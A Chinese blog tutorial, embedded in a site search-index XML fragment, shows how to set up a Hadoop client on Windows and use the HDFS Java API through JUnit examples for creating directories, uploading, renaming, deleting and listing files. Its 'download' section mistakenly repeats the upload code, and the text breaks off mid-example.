      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HDFS API操作</title>
      <link href="/blog/addda9af.html/"/>
      <url>/blog/addda9af.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：客户端环境准备"><a href="#一：客户端环境准备" class="headerlink" title="一：客户端环境准备"></a>一：客户端环境准备</h1><h2 id="1-1-下载并安装-Windows-依赖"><a href="#1-1-下载并安装-Windows-依赖" class="headerlink" title="1.1 下载并安装 Windows 依赖"></a>1.1 下载并安装 Windows 依赖</h2><p><a href="https://github.com/cdarlint/winutils">cdarlint&#x2F;winutils: winutils.exe hadoop.dll and hdfs.dll binaries for hadoop windows (github.com)</a></p><h2 id="1-2-配置环境变量"><a href="#1-2-配置环境变量" class="headerlink" title="1.2 配置环境变量"></a>1.2 配置环境变量</h2><p><img src="/blog/addda9af.html/image-20221215103203883.png"></p><p><img src="/blog/addda9af.html/image-20221215103253975.png"></p><h2 id="1-3-双击运行"><a href="#1-3-双击运行" class="headerlink" title="1.3 双击运行"></a>1.3 双击运行</h2><p><img src="/blog/addda9af.html/image-20221215103119736.png"></p><h1 id="二：IDEA-实例测试"><a href="#二：IDEA-实例测试" class="headerlink" title="二：IDEA 实例测试"></a>二：IDEA 实例测试</h1><h2 id="2-1-添加maven-依赖"><a href="#2-1-添加maven-依赖" class="headerlink" title="2.1 添加maven 依赖"></a>2.1 添加maven 依赖</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hadoop<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hadoop-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.13.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-log4j12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.32<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-2-配置日志"><a href="#2-2-配置日志" class="headerlink" title="2.2 配置日志"></a>2.2 配置日志</h2><p>在项目的 src&#x2F;main&#x2F;resources 目录下，新建一个文件，命名为“log4j.properties”，在文件中填入：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">log4j.rootLogger</span>=<span class="string">INFO, stdout</span></span><br><span class="line"><span class="attr">log4j.appender.stdout</span>=<span class="string">org.apache.log4j.ConsoleAppender</span></span><br><span class="line"><span class="attr">log4j.appender.stdout.layout</span>=<span class="string">org.apache.log4j.PatternLayout</span></span><br><span class="line"><span class="attr">log4j.appender.stdout.layout.ConversionPattern</span>=<span class="string">%d %p [%c] - %m%n</span></span><br><span class="line"><span class="attr">log4j.appender.logfile</span>=<span class="string">org.apache.log4j.FileAppender</span></span><br><span class="line"><span class="attr">log4j.appender.logfile.File</span>=<span class="string">target/spring.log</span></span><br><span class="line"><span class="attr">log4j.appender.logfile.layout</span>=<span class="string">org.apache.log4j.PatternLayout</span></span><br><span class="line"><span class="attr">log4j.appender.logfile.layout.ConversionPattern</span>=<span class="string">%d %p [%c] - %m%n</span></span><br></pre></td></tr></table></figure><h2 id="2-3-代码实现"><a href="#2-3-代码实现" class="headerlink" title="2.3 代码实现"></a>2.3 代码实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.hdfs;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.FileSystem;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.Path;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URISyntaxException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 10:51 2022/12/15</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">hdfsClient</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testMkdirs</span><span class="params">()</span> <span class="keyword">throws</span> URISyntaxException, IOException, InterruptedException &#123;</span><br><span class="line">        <span class="comment">// 1 获取文件系统</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Configuration</span> <span class="variable">configuration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">FileSystem</span> <span class="variable">fileSystem</span> <span class="operator">=</span> FileSystem.get(<span class="keyword">new</span> <span class="title class_">URI</span>(<span class="string">&quot;hdfs://hadoop100:8020&quot;</span>), configuration, <span class="string">&quot;ghost&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2 创建目录</span></span><br><span class="line">        fileSystem.mkdirs(<span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;/ghost&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3 关闭资源</span></span><br><span class="line">        fileSystem.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-4-执行程序"><a href="#2-4-执行程序" class="headerlink" title="2.4 执行程序"></a>2.4 执行程序</h2><p>客户端去操作 HDFS 时，是有一个用户身份的。默认情况下，HDFS 客户端 API 会从采 用 Windows 默认用户访问 HDFS，会报权限异常错误。所以在访问 HDFS 时，一定要配置 用户。</p><h1 id="三：API-案例操作"><a href="#三：API-案例操作" class="headerlink" title="三：API 案例操作"></a>三：API 案例操作</h1><h2 id="3-1-HDFS-文件上传"><a href="#3-1-HDFS-文件上传" class="headerlink" title="3.1 HDFS 文件上传"></a>3.1 HDFS 文件上传</h2><h3 id="（1）代码实现"><a href="#（1）代码实现" class="headerlink" title="（1）代码实现"></a>（1）代码实现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.hdfs;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.FileSystem;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.Path;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URISyntaxException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 11:35 2022/12/15</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ApiDemo</span> &#123;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testCopyFromLocalFile</span><span class="params">()</span> <span class="keyword">throws</span> URISyntaxException, IOException, InterruptedException &#123;</span><br><span class="line">        <span class="comment">// 获取文件系统</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Configuration</span> <span class="variable">configuration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">FileSystem</span> <span class="variable">fileSystem</span> <span class="operator">=</span> FileSystem.get(<span class="keyword">new</span> <span class="title class_">URI</span>(<span class="string">&quot;hdfs://hadoop100:8020&quot;</span>), configuration, <span class="string">&quot;ghost&quot;</span>);</span><br><span class="line">        <span class="comment">// 上传文件</span></span><br><span class="line">        fileSystem.copyFromLocalFile(<span class="literal">false</span>, <span class="literal">false</span>, <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;Y:\\Temp\\lol.txt&quot;</span>), <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;/lol/lol.txt&quot;</span>));</span><br><span class="line">        <span class="comment">// 关闭资源</span></span><br><span class="line">        fileSystem.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（2）重构代码（代码模板）"><a href="#（2）重构代码（代码模板）" class="headerlink" title="（2）重构代码（代码模板）"></a>（2）重构代码（代码模板）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.hdfs;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.FileSystem;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.Path;</span><br><span class="line"><span class="keyword">import</span> org.junit.After;</span><br><span class="line"><span class="keyword">import</span> org.junit.Before;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URISyntaxException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 11:35 2022/12/15</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ApiDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> FileSystem fileSystem;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> <span class="keyword">throws</span> URISyntaxException, IOException, InterruptedException &#123;</span><br><span class="line">        <span class="comment">// 获取文件系统</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Configuration</span> <span class="variable">configuration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>();</span><br><span class="line">        <span class="comment">// Ctrl + F 提升作用域</span></span><br><span class="line">        fileSystem = FileSystem.get(<span class="keyword">new</span> <span class="title class_">URI</span>(<span class="string">&quot;hdfs://hadoop100:8020&quot;</span>), configuration, <span class="string">&quot;ghost&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@After</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 关闭资源</span></span><br><span class="line">        fileSystem.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testCopyFromLocalFile</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 上传文件</span></span><br><span class="line">        fileSystem.copyFromLocalFile(<span class="literal">true</span>, <span class="literal">true</span>, <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;Y:\\Temp\\lol.txt&quot;</span>), <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;/lol/lol.txt&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（3）参数优先级"><a href="#（3）参数优先级" class="headerlink" title="（3）参数优先级"></a>（3）参数优先级</h3><p>参数优先级排序：（1）客户端代码中设置的值 &gt;（2）ClassPath 下的用户自定义配置文 件 &gt;（3）然后是服务器的自定义配置（xxx-site.xml）&gt;（4）服务器的默认配置（xxx-default.xml）</p><p>将 hdfs-site.xml 拷贝到项目的 resources 资源目录下；</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=<span class="string">&quot;text/xsl&quot;</span> href=<span class="string">&quot;configuration.xsl&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.replication<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>Default block replication.</span><br><span class="line">            The actual number of replications can be specified when the file is created.</span><br><span class="line">            The default is used if replication is not specified in create time.</span><br><span class="line">        <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在代码中设置 副本数量测试：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.hdfs;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.FileSystem;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.Path;</span><br><span class="line"><span class="keyword">import</span> org.junit.After;</span><br><span class="line"><span class="keyword">import</span> org.junit.Before;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URISyntaxException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 11:35 2022/12/15</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ApiDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> FileSystem fileSystem;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> <span class="keyword">throws</span> URISyntaxException, IOException, InterruptedException &#123;</span><br><span class="line">        <span class="comment">// 获取文件系统</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Configuration</span> <span class="variable">configuration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>();</span><br><span class="line">        configuration.set(<span class="string">&quot;dfs.replication&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="comment">// Ctrl + F 提升作用域</span></span><br><span class="line">        fileSystem = FileSystem.get(<span class="keyword">new</span> <span class="title class_">URI</span>(<span class="string">&quot;hdfs://hadoop100:8020&quot;</span>), configuration, <span class="string">&quot;ghost&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@After</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 关闭资源</span></span><br><span class="line">        fileSystem.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testCopyFromLocalFile</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 上传文件</span></span><br><span class="line">        fileSystem.copyFromLocalFile(<span class="literal">false</span>, <span class="literal">true</span>, <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;Y:\\Temp\\lol.txt&quot;</span>), <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;/lol/lol.txt&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-2-HDFS-文件下载"><a href="#3-2-HDFS-文件下载" class="headerlink" title="3.2 HDFS 文件下载"></a>3.2 HDFS 文件下载</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testCopyFromLocalFile</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 上传文件</span></span><br><span class="line">        fileSystem.copyFromLocalFile(<span class="literal">false</span>, <span class="literal">true</span>, <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;Y:\\Temp\\lol.txt&quot;</span>), <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;/lol/lol.txt&quot;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="3-3-HDFS-文件更名和移动"><a href="#3-3-HDFS-文件更名和移动" class="headerlink" title="3.3 HDFS 文件更名和移动"></a>3.3 HDFS 文件更名和移动</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testMv</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 修改文件名称</span></span><br><span class="line">    <span class="comment">// fileSystem.rename(new Path(&quot;/jinguo/weiguo.txt&quot;),new Path(&quot;/jinguo/wuguo.txt&quot;));</span></span><br><span class="line">    <span class="comment">// 移动并修改文件名称(目标地址目录必须存在)</span></span><br><span class="line">    fileSystem.rename(<span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;/jinguo/shuguo.txt&quot;</span>), <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;/sanguo/wangguo.txt&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-4-HDFS-删除文件和目录"><a href="#3-4-HDFS-删除文件和目录" class="headerlink" title="3.4 HDFS 删除文件和目录"></a>3.4 HDFS 删除文件和目录</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testDelete</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// fileSystem.delete(new Path(&quot;/sanguo&quot;), true);</span></span><br><span class="line">    fileSystem.delete(<span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;/jinguo/wuguo.txt&quot;</span>), <span class="literal">true</span>);  <span class="comment">// 仅删除文件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-5-HDFS-文件详情查看"><a href="#3-5-HDFS-文件详情查看" class="headerlink" title="3.5 HDFS 文件详情查看"></a>3.5 HDFS 文件详情查看</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testFileInfo</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 空目录会跳过</span></span><br><span class="line">       RemoteIterator&lt;LocatedFileStatus&gt; remoteIterator = fileSystem.listFiles(<span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;/&quot;</span>), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">while</span> (remoteIterator.hasNext()) &#123;</span><br><span class="line">           <span class="type">LocatedFileStatus</span> <span class="variable">fileStatus</span> <span class="operator">=</span> remoteIterator.next();</span><br><span class="line">           System.out.println(<span class="string">&quot;======&quot;</span> + fileStatus.getPath() + <span class="string">&quot;======&quot;</span>);</span><br><span class="line">           System.out.println(fileStatus.getPermission());</span><br><span class="line">           System.out.println(fileStatus.getOwner());</span><br><span class="line">           System.out.println(fileStatus.getGroup());</span><br><span class="line">           System.out.println(fileStatus.getLen());</span><br><span class="line">           System.out.println(fileStatus.getModificationTime());</span><br><span class="line">           System.out.println(fileStatus.getReplication());</span><br><span class="line">           System.out.println(fileStatus.getBlockSize());</span><br><span class="line">           System.out.println(fileStatus.getPath().getName());</span><br><span class="line"></span><br><span class="line">           <span class="comment">// 获取块信息</span></span><br><span class="line">           BlockLocation[] blockLocations = fileStatus.getBlockLocations();</span><br><span class="line">           System.out.println(Arrays.toString(blockLocations));</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="3-6-HDFS-文件和文件夹判断"><a href="#3-6-HDFS-文件和文件夹判断" class="headerlink" title="3.6 HDFS 文件和文件夹判断"></a>3.6 HDFS 文件和文件夹判断</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testListStatus</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">       <span class="keyword">final</span> FileStatus[] fileStatuses = fileSystem.listStatus(<span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;/&quot;</span>));</span><br><span class="line">       <span class="keyword">for</span> (FileStatus fileStatus : fileStatuses) &#123;</span><br><span class="line">           <span class="comment">// 如果是文件</span></span><br><span class="line">           <span class="keyword">if</span> (fileStatus.isFile()) &#123;</span><br><span class="line">               System.out.println(<span class="string">&quot;file:&quot;</span> + fileStatus.getPath().getName());</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               System.out.println(<span class="string">&quot;dir:&quot;</span> + fileStatus.getPath().getName());</span><br><span class="line">           